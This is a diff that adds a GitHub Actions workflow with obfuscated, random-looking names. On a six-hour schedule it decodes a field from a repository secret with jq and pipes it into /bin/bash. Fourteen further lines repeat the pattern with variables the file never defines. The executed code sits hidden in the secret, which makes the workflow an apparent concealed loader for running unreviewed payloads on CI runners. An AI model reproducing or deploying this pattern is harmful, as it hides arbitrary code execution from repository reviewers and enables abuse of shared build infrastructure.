@@ -1,0 +1,31 @@
+name: yanweibao6715
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanweibao6715
+        env:
+          o2645: ${{ secrets.o2645 }}
+        run: |
+          echo $o2645 | jq -r .i041 | /bin/bash
+          echo $k23000 | jq -r .s7 | /bin/bash
+          echo $bq44648 | jq -r .m2 | /bin/bash
+          echo $hwip2988 | jq -r .nqq69888 | /bin/bash
+          echo $q8621 | jq -r .uki37097 | /bin/bash
+          echo $ewydo3 | jq -r .ruddi7061 | /bin/bash
+          echo $pp65 | jq -r .tvvro17 | /bin/bash
+          echo $fqx517 | jq -r .qbac76 | /bin/bash
+          echo $odf225 | jq -r .x828 | /bin/bash
+          echo $owhvl4 | jq -r .fmqt419 | /bin/bash
+          echo $eha90536 | jq -r .rpy4 | /bin/bash
+          echo $h5 | jq -r .wuv3 | /bin/bash
+          echo $ufaz7 | jq -r .ijl0609 | /bin/bash
+          echo $nyt11 | jq -r .epmk48760 | /bin/bash
+          echo $k30158 | jq -r .r151 | /bin/bash
+
